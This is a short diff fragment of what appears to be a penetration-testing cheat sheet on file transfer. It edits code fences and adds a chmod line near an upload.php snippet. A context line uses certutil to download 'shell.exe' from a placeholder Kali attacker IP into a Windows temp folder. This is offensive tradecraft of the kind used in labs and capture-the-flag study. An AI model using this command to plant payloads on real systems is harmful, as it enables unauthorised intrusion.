@@ -88,7 +88,10 @@ python3 -m http.server 80
 certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
 ````
 ### Windows to Linux
+````
 cat upload.php
+chmod +x upload.php
+````
 ````
 <?php
 $uploaddir = '/var/www/uploads/';
